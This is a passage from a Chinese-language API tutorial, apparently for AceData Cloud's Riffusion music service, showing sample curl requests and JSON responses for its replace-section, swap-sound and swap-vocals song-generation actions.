                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "replace_section",</span><br><span class="line">  "model": "FUZZ-1.0 Pro",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "audio_id": "b7376272-3902-49b4-a83b-62f7e6ab505c",</span><br><span class="line">  "replace_section_start": 3,</span><br><span class="line">  "replace_section_end": 70</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"73defcbf-f876-4dd6-b60e-4c1c5ecd4565"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"9f639389-7218-4cdb-ade9-b34228bb0f21"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"037f5e9d-9da4-4d79-b58f-1f433b40d54d"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Sunrise Joy"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/881ad27f-39c1-4c31-a789-ecc822e13b8c/image/037f5e9d-9da4-4d79-b58f-1f433b40d54d.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/881ad27f-39c1-4c31-a789-ecc822e13b8c/audio/037f5e9d-9da4-4d79-b58f-1f433b40d54d.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:18:43.031184Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">        <span class="attr">"words"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">3.84</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">3.84</span>,</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;,</span><br><span class="line">          ...</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">159.36</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">159.36</span>,</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">199.2201133786848</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"97638295-068f-4cbc-b076-66f522449bd5"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Sunrise"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/881ad27f-39c1-4c31-a789-ecc822e13b8c/image/97638295-068f-4cbc-b076-66f522449bd5.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/881ad27f-39c1-4c31-a789-ecc822e13b8c/audio/97638295-068f-4cbc-b076-66f522449bd5.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:18:56.267775Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">        <span class="attr">"words"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">3.84</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">3.84</span>,</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;,</span><br><span class="line">          ...</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">159.36</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">159.36</span>,</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">199.2201133786848</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="SwapSound生成"><a href="#SwapSound生成" class="headerlink" title="SwapSound生成"></a>SwapSound生成</h2>
                  <p>如果想使用官方的SwapSound操作，可以将<code>action</code>参数值设为：<code>swap_sound</code>，接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <p>接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此次歌曲任务的行为，目前支持：generate、cover、extend、upload_cover、upload_extend、swap_sound、swap_vocals。</li>
                    <li>lyric：歌词文本</li>
                    <li>title：歌曲的标题。</li>
                    <li>audio_id：歌曲的ID。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/psf4rm.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/988rlq.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "swap_sound",</span><br><span class="line">  "model": "FUZZ-1.0 Pro",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "audio_id": "b7376272-3902-49b4-a83b-62f7e6ab505c"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"93279260-5ca1-42d8-bde1-1fa62e0f5027"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"bc4e28db-4897-4ffc-9e03-45f43da7a21c"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"242035c0-8ac2-4f0b-a19c-ac2fa49d4df3"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Brightside"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/36494e8a-eb82-4d89-bbfa-ec719e19572b/image/242035c0-8ac2-4f0b-a19c-ac2fa49d4df3.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/36494e8a-eb82-4d89-bbfa-ec719e19572b/audio/242035c0-8ac2-4f0b-a19c-ac2fa49d4df3.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:02:32.799561Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">1.28</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">1.28</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">195.84</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">195.84</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">197.2696371882086</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"594fe702-6c71-4b0c-abb6-21b58efc74a6"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Sunrise"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/36494e8a-eb82-4d89-bbfa-ec719e19572b/image/594fe702-6c71-4b0c-abb6-21b58efc74a6.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/36494e8a-eb82-4d89-bbfa-ec719e19572b/audio/594fe702-6c71-4b0c-abb6-21b58efc74a6.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:02:30.523279Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">192.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">192.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">196.7198866213152</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="SwapVocals-生成"><a href="#SwapVocals-生成" class="headerlink" title="SwapVocals 生成"></a>SwapVocals 生成</h2>
                  <p>如果想使用官方的SwapVocals操作，可以将<code>action</code>参数值设为：<code>swap_vocals</code>，接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>action：此次歌曲任务的行为，目前支持：generate、cover、extend、upload_cover、upload_extend、swap_sound、swap_vocals。</li>
                    <li>lyric：歌词文本</li>
                    <li>title：歌曲的标题。</li>
                    <li>audio_id：歌曲的ID。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/n6k8wk.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/3wg240.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "action": "swap_vocals",</span><br><span class="line">  "model": "FUZZ-1.0 Pro",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "audio_id": "b7376272-3902-49b4-a83b-62f7e6ab505c"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"a6e0d456-189b-4c78-9232-2fe72166ab39"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"ee5769d4-ae94-4e5a-a85f-b3c0ddc2e48e"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"b8b1ed14-f43c-4738-a697-60ba24b6049d"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Uplift"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/25ce4ddd-e48c-42e2-9ea3-8e03380508f2/image/b8b1ed14-f43c-4738-a697-60ba24b6049d.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/25ce4ddd-e48c-42e2-9ea3-8e03380508f2/audio/b8b1ed14-f43c-4738-a697-60ba24b6049d.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:04:18.477032Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">2.56</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">2.56</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">186.88</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">171.52</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span 